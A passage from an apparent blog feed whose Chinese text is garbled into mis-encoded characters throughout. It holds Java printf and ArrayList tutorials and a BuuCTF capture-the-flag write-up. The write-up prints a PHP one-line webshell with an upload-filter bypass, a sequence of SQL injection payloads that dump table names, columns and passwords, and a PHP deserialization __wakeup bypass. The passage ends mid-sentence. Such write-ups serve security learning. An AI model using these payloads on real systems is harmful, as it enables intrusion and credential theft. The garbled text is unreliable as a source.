¼å¼è¾“å‡ºã€‚</li><li><code>%c</code>ï¼šè¾“å‡ºä¸€ä¸ªå­—ç¬¦ã€‚</li><li><code>%b</code>ï¼šè¾“å‡ºä¸€ä¸ªå¸ƒå°”å€¼ã€‚</li><li><code>%h</code>ï¼šè¾“å‡ºä¸€ä¸ªå“ˆå¸Œç ï¼ˆ16è¿›åˆ¶ï¼‰ã€‚</li><li><code>%n</code>ï¼šæ¢è¡Œç¬¦ã€‚</li></ul><p>é™¤äº†è½¬æ¢è¯´æ˜ç¬¦ä¹‹å¤–ï¼ŒJava çš„ printf æ–¹æ³•è¿˜æ”¯æŒä¸€äº›ä¿®é¥°ç¬¦ï¼Œç”¨äºæŒ‡å®šè¾“å‡ºçš„å®½åº¦ã€ç²¾åº¦ã€å¯¹é½æ–¹å¼ç­‰ã€‚</p><ul><li>å®½åº¦ä¿®é¥°ç¬¦ï¼šç”¨æ•°å­—æŒ‡å®šè¾“å‡ºçš„æœ€å°å®½åº¦ï¼Œå¦‚æœè¾“å‡ºçš„æ•°æ®ä¸è¶³æŒ‡å®šå®½åº¦ï¼Œåˆ™åœ¨å·¦ä¾§æˆ–å³ä¾§å¡«å……ç©ºæ ¼æˆ–é›¶ã€‚</li><li>ç²¾åº¦ä¿®é¥°ç¬¦ï¼šç”¨ç‚¹å·ï¼ˆ.ï¼‰å’Œæ•°å­—æŒ‡å®šæµ®ç‚¹æ•°æˆ–å­—ç¬¦ä¸²çš„ç²¾åº¦ï¼Œå¯¹äºæµ®ç‚¹æ•°ï¼ŒæŒ‡å®šå°æ•°ç‚¹åçš„ä½æ•°ï¼Œå¯¹äºå­—ç¬¦ä¸²ï¼ŒæŒ‡å®šè¾“å‡ºçš„å­—ç¬¦æ•°ã€‚</li><li>å¯¹é½ä¿®é¥°ç¬¦ï¼šç”¨å‡å·ï¼ˆ-ï¼‰æˆ–é›¶å·ï¼ˆ0ï¼‰æŒ‡å®šè¾“å‡ºçš„å¯¹é½æ–¹å¼ï¼Œå‡å·è¡¨ç¤ºå·¦å¯¹é½ï¼Œé›¶å·è¡¨ç¤ºå³å¯¹é½å¹¶å¡«å……é›¶ã€‚</li></ul><p>ä¸‹é¢æ˜¯ä¸€äº›ç¤ºä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">123</span>;</span><br><span class="line">System.out.printf(<span class="string">&quot;%5d\n&quot;</span>, num); <span class="comment">// è¾“å‡º &quot;  123&quot;</span></span><br><span class="line">System.out.printf(<span class="string">&quot;%-5d\n&quot;</span>, num); <span class="comment">// è¾“å‡º &quot;123  &quot;</span></span><br><span class="line">System.out.printf(<span class="string">&quot;%05d\n&quot;</span>, num); <span class="comment">// è¾“å‡º &quot;00123&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="type">double</span> <span class="variable">pi</span> <span class="operator">=</span> Math.PI;</span><br><span class="line">System.out.printf(<span class="string">&quot;%10.2f\n&quot;</span>, pi); <span class="comment">// è¾“å‡º &quot;      3.14&quot;</span></span><br><span class="line">System.out.printf(<span class="string">&quot;%-10.4f\n&quot;</span>, pi); <span class="comment">// è¾“å‡º &quot;3.1416    &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;æ²‰é»˜ç‹äºŒ&quot;</span>;</span><br><span class="line">System.out.printf(<span class="string">&quot;%10s\n&quot;</span>, name); <span class="comment">// è¾“å‡º &quot;     æ²‰é»˜ç‹äºŒ&quot;</span></span><br><span class="line">System.out.printf(<span class="string">&quot;%-10s\n&quot;</span>, name); <span class="comment">// è¾“å‡º &quot;æ²‰é»˜ç‹äºŒ     &quot;</span></span><br></pre></td></tr></table></figure><p>å…·ä½“æ¥è¯´ï¼Œ</p><ul><li>æˆ‘ä»¬ä½¿ç”¨ <code>%5d</code> æ¥æŒ‡å®šè¾“å‡ºçš„æ•´æ•°å æ® 5 ä¸ªå­—ç¬¦çš„å®½åº¦ï¼Œä¸è¶³éƒ¨åˆ†åœ¨å·¦ä¾§å¡«å……ç©ºæ ¼ã€‚</li><li>ä½¿ç”¨ <code>%-5d</code> æ¥æŒ‡å®šè¾“å‡ºçš„æ•´æ•°å æ® 5 ä¸ªå­—ç¬¦çš„å®½åº¦ï¼Œä¸è¶³éƒ¨åˆ†åœ¨å³ä¾§å¡«å……ç©ºæ ¼ã€‚</li><li>ä½¿ç”¨ <code>%05d</code> æ¥æŒ‡å®šè¾“å‡ºçš„æ•´æ•°å æ® 5 ä¸ªå­—ç¬¦çš„å®½åº¦ï¼Œä¸è¶³éƒ¨åˆ†åœ¨å·¦ä¾§å¡«å…… 0ã€‚</li><li>ä½¿ç”¨ <code>%10.2f</code> æ¥æŒ‡å®šè¾“å‡ºçš„æµ®ç‚¹æ•°å æ® 10 ä¸ªå­—ç¬¦çš„å®½åº¦ï¼Œä¿ç•™ 2 ä½å°æ•°ï¼Œä¸è¶³éƒ¨åˆ†åœ¨å·¦ä¾§å¡«å……ç©ºæ ¼ã€‚</li><li>ä½¿ç”¨ <code>%-10.4f</code> æ¥æŒ‡å®šè¾“å‡ºçš„æµ®ç‚¹æ•°å æ® 10 ä¸ªå­—ç¬¦çš„å®½åº¦ï¼Œä¿ç•™ 4 ä½å°æ•°ï¼Œä¸è¶³éƒ¨åˆ†åœ¨å³ä¾§å¡«å……ç©ºæ ¼ã€‚</li><li>ä½¿ç”¨ <code>%10s</code> æ¥æŒ‡å®šè¾“å‡ºçš„å­—ç¬¦ä¸²å æ® 10 ä¸ªå­—ç¬¦çš„å®½åº¦ï¼Œä¸è¶³éƒ¨åˆ†åœ¨å·¦ä¾§å¡«å……ç©ºæ ¼ã€‚</li><li>ä½¿ç”¨ <code>%-10s</code> æ¥æŒ‡å®šè¾“å‡ºçš„å­—ç¬¦ä¸²å æ® 10 ä¸ªå­—ç¬¦çš„å®½åº¦ï¼Œä¸è¶³éƒ¨åˆ†åœ¨å³ä¾§å¡«å……ç©ºæ ¼ã€‚</li></ul><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ç»™å‡ºä¸€ä¸ª PrintWriter çš„ç¤ºä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrintWriter</span>(<span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="string">&quot;output.txt&quot;</span>));</span><br><span class="line">writer.println(<span class="string">&quot;æ²‰é»˜ç‹äºŒ&quot;</span>);</span><br><span class="line">writer.printf(<span class="string">&quot;ä»–çš„å¹´çºªä¸º %d.\n&quot;</span>, <span class="number">18</span>);</span><br><span class="line">writer.close();</span><br></pre></td></tr></table></figure><p>é¦–å…ˆï¼Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ª PrintWriter å¯¹è±¡ï¼Œå®ƒçš„æ„é€ å‡½æ•°æ¥æ”¶ä¸€ä¸ª Writer å¯¹è±¡ä½œä¸ºå‚æ•°ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬ä½¿ç”¨ FileWriter æ¥åˆ›å»ºä¸€ä¸ªè¾“å‡ºæ–‡ä»¶æµï¼Œå¹¶å°†å…¶ä½œä¸ºå‚æ•°ä¼ é€’ç»™ PrintWriter çš„æ„é€ å‡½æ•°ã€‚ç„¶åï¼Œæˆ‘ä»¬ä½¿ç”¨ PrintWriter çš„ println å’Œ printf æ–¹æ³•æ¥è¾“å‡ºä¸¤è¡Œå†…å®¹ï¼Œå…¶ä¸­ printf æ–¹æ³•å¯ä»¥æ¥æ”¶æ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚æœ€åï¼Œæˆ‘ä»¬è°ƒç”¨ PrintWriter çš„ close æ–¹æ³•æ¥å…³é—­è¾“å‡ºæµã€‚</p><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥ä¸åˆ›å»º FileWriter å¯¹è±¡ï¼Œç›´æ¥æŒ‡å®šæ–‡ä»¶åã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PrintWriter</span> <span class="variable">pw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrintWriter</span>(<span class="string">&quot;output.txt&quot;</span>);</span><br><span class="line">pw.println(<span class="string">&quot;æ²‰é»˜ç‹äºŒ&quot;</span>);</span><br><span class="line">pw.printf(<span class="string">&quot;ä»–çš„å¹´çºªä¸º %d.\n&quot;</span>, <span class="number">18</span>);</span><br><span class="line">pw.close();</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Javaå¼€å‘ã€‘é›†åˆæ¡†æ¶ï¼ˆå®¹å™¨ï¼‰</title>
      <link href="/2024/10/25/code/javacollection/"/>
      <url>/2024/10/25/code/javacollection/</url>
      
        <content type="html"><![CDATA[<h2 id="ArrayListè¯¦è§£"><a href="#ArrayListè¯¦è§£" class="headerlink" title="ArrayListè¯¦è§£"></a>ArrayListè¯¦è§£</h2><p><a href="https://javabetter.cn/collection/arraylist.html">https://javabetter.cn/collection/arraylist.html</a><br>ArrayList åœ¨æ•°ç»„çš„åŸºç¡€ä¸Šå®ç°äº†è‡ªåŠ¨æ‰©å®¹ï¼Œå¹¶ä¸”æä¾›äº†æ¯”æ•°ç»„æ›´ä¸°å¯Œçš„é¢„å®šä¹‰æ–¹æ³•ï¼ˆå„ç§å¢åˆ æ”¹æŸ¥ï¼‰ï¼Œéå¸¸çµæ´»ã€‚<code>ArrayList</code> æ˜¯ Java ä¸­çš„ä¸€ç§å¯è°ƒæ•´å¤§å°çš„æ•°ç»„å®ç°ï¼Œå®ƒå±äº <code>java.util</code> åŒ…ä¸‹çš„ <code>List</code> æ¥å£çš„å®ç°ç±»ã€‚<code>ArrayList</code> æä¾›äº†åŠ¨æ€æ•°ç»„çš„åŠŸèƒ½ï¼Œè¿™æ„å‘³ç€å®ƒèƒ½å¤Ÿæ ¹æ®éœ€è¦å¢åŠ å’Œå‡å°‘å…¶å¤§å°ã€‚è¿™å¯¹äºåœ¨ç¼–ç¨‹ä¸­éœ€è¦ç»å¸¸ä¿®æ”¹æ•°ç»„å¤§å°çš„åœºæ™¯éå¸¸æœ‰ç”¨ã€‚</p><h3 id="ArrayList-çš„ä¸»è¦ç‰¹æ€§"><a href="#ArrayList-çš„ä¸»è¦ç‰¹æ€§" class="headerlink" title="ArrayList çš„ä¸»è¦ç‰¹æ€§"></a>ArrayList çš„ä¸»è¦ç‰¹æ€§</h3><ol><li><strong>åŠ¨æ€æ‰©å±•</strong>ï¼šé»˜è®¤æƒ…å†µä¸‹ï¼Œ<code>ArrayList</code> åœ¨å…ƒç´ å¡«æ»¡å®¹é‡æ—¶ä¼šè‡ªåŠ¨æ‰©å¤§çº¦ä¸ºåŸæ¥çš„1.5å€ã€‚</li><li><strong>éšæœºè®¿é—®</strong>ï¼š<code>ArrayList</code> æ”¯æŒå¿«é€Ÿéšæœºè®¿é—®ï¼Œæ—¶é—´å¤æ‚åº¦ä¸º O(1)ï¼Œå› ä¸ºå®ƒåº•å±‚æ˜¯é€šè¿‡æ•°ç»„å®ç°çš„ã€‚</li><li><strong>æ’å…¥åˆ é™¤æˆæœ¬é«˜</strong>ï¼šç”±äºæ˜¯æ•°ç»„å®ç°ï¼Œæ’å…¥å’Œåˆ é™¤æ“ä½œå¯èƒ½éœ€è¦ç§»åŠ¨å…ƒç´ ä»¥ä¿æŒå…ƒç´ çš„è¿ç»­æ€§ï¼Œè¿™ä½¿å¾—å¹³å‡æ’å…¥å’Œåˆ é™¤æ“ä½œçš„æ—¶é—´å¤æ‚åº¦ä¸º O(n)ã€‚</li></ol><h3 id="å¸¸ç”¨æ–¹æ³•"><a href="#å¸¸ç”¨æ–¹æ³•" class="headerlink" title="å¸¸ç”¨æ–¹æ³•"></a>å¸¸ç”¨æ–¹æ³•</h3><ul><li><code>add(E e)</code>ï¼šå‘ <code>ArrayList</code> çš„æœ«å°¾æ·»åŠ ä¸€ä¸ªå…ƒç´ ã€‚</li><li><code>add(int index, E element)</code>ï¼šåœ¨æŒ‡å®šä½ç½®æ’å…¥ä¸€ä¸ªå…ƒç´ ã€‚</li><li><code>remove(int index)</code>ï¼šç§»é™¤æŒ‡å®šä½ç½®çš„å…ƒç´ ã€‚</li><li><code>get(int index)</code>ï¼šè¿”å›æŒ‡å®šä½ç½®ä¸Šçš„å…ƒç´ ã€‚</li><li><code>set(int index, E element)</code>ï¼šå°†æŒ‡å®šä½ç½®çš„å…ƒç´ æ›¿æ¢ä¸ºæ–°å…ƒç´ ã€‚</li><li><code>size()</code>ï¼šè¿”å› <code>ArrayList</code> ä¸­çš„å…ƒç´ ä¸ªæ•°ã€‚</li><li><code>clear()</code>ï¼šç§»é™¤æ‰€æœ‰å…ƒç´ ï¼Œæ¸…ç©ºåˆ—è¡¨ã€‚</li><li><code>isEmpty()</code>ï¼šæ£€æŸ¥åˆ—è¡¨æ˜¯å¦ä¸ºç©ºã€‚</li></ul><h3 id="ç¤ºä¾‹ä»£ç "><a href="#ç¤ºä¾‹ä»£ç " class="headerlink" title="ç¤ºä¾‹ä»£ç "></a>ç¤ºä¾‹ä»£ç </h3><p>ä¸‹é¢æ˜¯ä¸€äº›ä½¿ç”¨ <code>ArrayList</code> çš„åŸºæœ¬ç¤ºä¾‹ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ArrayListExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ArrayList&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ·»åŠ å…ƒç´ </span></span><br><span class="line">        list.add(<span class="string">&quot;Java&quot;</span>);</span><br><span class="line">        list.add(<span class="string">&quot;Python&quot;</span>);</span><br><span class="line">        list.add(<span class="string">&quot;C++&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åœ¨ç¬¬ä¸€ä¸ªä½ç½®æ’å…¥æ–°å…ƒç´ </span></span><br><span class="line">        list.add(<span class="number">0</span>, <span class="string">&quot;JavaScript&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è®¿é—®å…ƒç´ </span></span><br><span class="line">        System.out.println(<span class="string">&quot;Element at index 1: &quot;</span> + list.get(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ç§»é™¤å…ƒç´ </span></span><br><span class="line">        list.remove(<span class="string">&quot;Python&quot;</span>); <span class="comment">// ç§»é™¤å¯¹è±¡</span></span><br><span class="line">        list.remove(<span class="number">2</span>); <span class="comment">// ç§»é™¤æŒ‡å®šç´¢å¼•ä½ç½®çš„å…ƒç´ </span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ›¿æ¢å…ƒç´ </span></span><br><span class="line">        list.set(<span class="number">0</span>, <span class="string">&quot;HTML&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è¾“å‡ºæ‰€æœ‰å…ƒç´ </span></span><br><span class="line">        System.out.println(<span class="string">&quot;Contents of list: &quot;</span> + list);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ¸…ç©ºåˆ—è¡¨</span></span><br><span class="line">        list.clear();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="åœ¨ç®—æ³•ä¸­çš„ä½¿ç”¨"><a href="#åœ¨ç®—æ³•ä¸­çš„ä½¿ç”¨" class="headerlink" title="åœ¨ç®—æ³•ä¸­çš„ä½¿ç”¨"></a>åœ¨ç®—æ³•ä¸­çš„ä½¿ç”¨</h3><p><code>ArrayList</code> åœ¨è®¸å¤šç®—æ³•ä¸­éƒ½éå¸¸æœ‰ç”¨ï¼Œå°¤å…¶æ˜¯åœ¨éœ€è¦åŠ¨æ€æ•°ç»„åŠŸèƒ½æ—¶ã€‚ä¾‹å¦‚ï¼Œåœ¨å¤„ç†ä¸å®šé‡æ•°æ®è¾“å…¥ã€è¿›è¡Œæ•°æ®èšåˆæ“ä½œæˆ–è€…åœ¨éœ€è¦é¢‘ç¹è®¿é—®å…ƒç´ è€Œä¸å¤ªé¢‘ç¹åœ°æ’å…¥æˆ–åˆ é™¤æ—¶ï¼Œ<code>ArrayList</code> æ˜¯ä¸€ä¸ªéå¸¸åˆé€‚çš„é€‰æ‹©ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€CTFã€‘BuuCTFè§£é¢˜è®°å½•</title>
      <link href="/2024/10/25/WebSecurity/ctf/buuctf/"/>
      <url>/2024/10/25/WebSecurity/ctf/buuctf/</url>
      
        <content type="html"><![CDATA[<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Upload-1"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Upload-1" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload 1"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload 1</h2><p>è¿™é“é¢˜å°±æ˜¯ä¸€ä¸ªç®€å•çš„æ–‡ä»¶ä¸Šä¼ è€ƒç‚¹ï¼Œä¸»è¦æ¶‰åŠçš„çŸ¥è¯†ç‚¹ï¼š</p><ul><li>ä¸€å¥è¯æœ¨é©¬ï¼š<code>&lt;script language=&#39;php&#39;&gt;eval($_POST[&#39;shell&#39;]);&lt;/script&gt;</code></li><li>ä¿®æ”¹æ–‡ä»¶å¤´ç»•è¿‡æ£€æµ‹ï¼šâ€™GIF89aâ€™ï¼Œè§£é¢˜æ—¶ç”¨äº†GIFçš„æ–‡ä»¶å¤´</li><li>çŒœæµ‹æ–‡ä»¶ä¸Šä¼ ç›®å½•ï¼›æ‹¼æ¥uploadè®¿é—®ä¸Šä¼ çš„æ–‡ä»¶</li><li>ä¿®æ”¹æ–‡ä»¶åç¼€æ‰§è¡Œè„šæœ¬ï¼šphpåç¼€è¢«é™åˆ¶äº†ï¼Œä½¿ç”¨htmlå¯ä»¥ä¸Šä¼ ï¼Œä½†æ˜¯htmlä¸ä¼šè¢«ä½œä¸ºè„šæœ¬æ‰§è¡Œï¼ŒæœåŠ¡å™¨ä½¿ç”¨äº†apacheï¼Œå®ƒé»˜è®¤æ˜¯æœ‰ä¸€ä¸ªphtmlè§£æçš„ï¼Œå®ƒçš„æ„æ€æ˜¯è¯´ï¼Œå¦‚æœä½ çš„æ–‡ä»¶æ˜¯ä»¥phtmlç»“å°¾çš„ï¼Œå®ƒä¼šæŠŠå®ƒå½“ä½œphpä»£ç æ¥æ‰§è¡Œï¼Œä¸»è¦æ˜¯application&#x2F;x-httpd-phpèƒ½å¤Ÿå°†æˆ‘ä»¬phtmlåŠ å…¥åˆ°phpæ–‡ä»¶è§£æçš„ç±»å‹å½“ä¸­</li></ul><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL</h2><p>SQLæ³¨å…¥ï¼Œç®€å•æµ‹è¯•<br><code>?username=admin&amp;password=admin&#39; or &#39;1&#39;=&#39;1</code> ä¸‡èƒ½å¯†ç å¤±è´¥ï¼Œå‘ç°orè¢«è¿‡æ»¤<br><code>?username=admin&amp;password=admin&#39; uunionnion sselectelect 1,2%23</code> å°è¯•å å†™ç»•è¿‡<br><code>?username=admin&amp;password=admin&#39; uunionnion sselectelect 1,2,3%23</code> ä¿®æ”¹payloadç»§ç»­çŒœè§£<br><code>?username=admin&amp;password=admin&#39; uunionnion sselectelect 1,2,group_concat(table_name)ffromrom infoorrmation_schema.tables wwherehere table_schema=database()%23</code> æ¥ä¸‹æ¥æŸ¥è¡¨<br><code>?username=admin&amp;password=admin&#39; uunionnion sselectelect 1,2,group_concat(column_name)ffromrom infoorrmation_schema.columns wwherehere table_name=&#39;b4bsql&#39;%23</code> è¿›ä¸€æ­¥æŸ¥è¯¢åˆ—å­—æ®µ,æŸ¥å‡ºä¸‰ä¸ªåˆ—å­—æ®µï¼šid,username,password<br><code>?username=admin&amp;password=admin&#39; uunionnion sselectelect 1,2,group_concat(passwoorrd)ffromrom b4bsql%23</code> flag</p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-PHP"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-PHP" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP</h2><p>å¸¸è§çš„ç½‘ç«™æºç å¤‡ä»½æ–‡ä»¶åç¼€:tar.gzï¼Œzipï¼Œrarï¼Œtar<br>å¸¸è§çš„ç½‘ç«™æºç å¤‡ä»½æ–‡ä»¶åï¼šwebï¼Œwebsiteï¼Œbackupï¼Œbackï¼Œwwwï¼Œwwwrootï¼Œtemp<br>è®¿é—® <a href="http://www.zip/">www.zip</a> æˆåŠŸè·å–åˆ°ç½‘ç«™æºä»£ç ï¼Œåˆ†ææºä»£ç ï¼Œåœ¨å…¶ä¸­å‘ç°ä¸‹é¢çš„ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span>=<span class="title function_ invoke__">unserialize</span>(@<span class="variable">$select</span>);</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾è¦ç”¨åˆ°phpååºåˆ—åŒ–æ¼æ´äº†ï¼Œä¹‹å‰æ•´ç†çš„phpæœ‰ä¸€ä¸ªæ¼æ´ç‚¹ï¼šå½“æˆå‘˜å±æ€§æ•°ç›®å¤§äºå®é™…æ•°ç›®æ—¶å¯ç»•è¿‡wakeupæ–¹æ³•<br>ä½¿ç”¨phpåœ¨çº¿æ‰§è¡Œå·¥å…·è¾“å‡ºåºåˆ—åŒ–åçš„æ•°æ®ï¼š<a href="https://www.jyshare.com/compile/1/">https://www.jyshare.com/compile/1/</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;admine&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;100&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> <span class="variable">$select</span> = <span class="keyword">new</span> <span class="title class_">Name</span>();</span><br><span class="line"> <span class="variable">$res</span>=<span class="title function_ invoke__">serialize</span>(@<span class="variable">$select</span>);   </span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$res</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç¨‹åºè¾“å‡ºï¼š<code>O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:6:&quot;admine&quot;;s:14:&quot;Namepassword&quot;;s:3:&quot;100&quot;;&#125;</code><br>æˆ‘ä»¬å°† 2 æ”¹ä¸º 3 æˆ–è€… æ¯”äºŒå¤§çš„æ•°å­—,åŒæ—¶ï¼Œæˆ‘ä»¬è¦å°†å£å˜ä¸º %00 